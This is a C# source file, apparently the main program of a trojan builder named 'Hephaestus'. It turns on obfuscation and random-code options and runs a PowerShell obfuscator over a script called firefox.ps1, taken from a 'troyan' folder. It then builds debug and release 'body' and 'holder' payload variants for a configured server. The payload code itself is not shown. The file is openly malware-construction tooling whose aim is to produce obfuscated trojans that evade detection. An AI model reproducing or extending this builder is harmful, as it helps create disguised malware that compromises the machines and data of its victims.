using model;

namespace TroyanBuilder;

public class Program
{
    public static bool ObfuscateDebug = false;
    
    public static bool ObfuscateRelease = true;
    
    public static bool RandomCode = true;
    
    public static bool RandomDo = true;
    
    static void Clean()
    {
        string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Hephaestus");

        if (Directory.Exists(path))
        {
            foreach (var file in Directory.GetFiles(path)) File.Delete(file);
            foreach (var dir in Directory.GetDirectories(path)) Directory.Delete(dir, true);
            Console.WriteLine("Contents deleted.");
        }

    }
    static void Main2()
    {
        Clean();
        var data = System.IO.File.ReadAllText(@"D:\soft\hephaestus\troyan\troyanps\firefox.ps1");
        data = new PowerShellObfuscator().Obfuscate(data);
        System.IO.File.WriteAllText(@"D:\soft\hephaestus\troyan\_output\1.ps1", data);
    }

    static void Main(string[] args)
    {
        Dev.DefaultServer(args.Length > 0 ? args[0] : Dev.Mode);
        Clean();
        var arr = new CustomBuilder[]{new BodyBuilderDebug(), new BodyBuilderRelease(), new HolderBuilderDebug(), new HolderBuilderRelease()};
        //var arr = new CustomBuilder[] { new BodyBuilderRelease() };
        foreach (var cb in arr)
        {
            Console.WriteLine(cb);
            var result = cb.Build(args.Length > 0 ? args[0] : Dev.Mode);
            foreach (var line in result)
            {
                Console.WriteLine(line);    
            }
        }
    }
}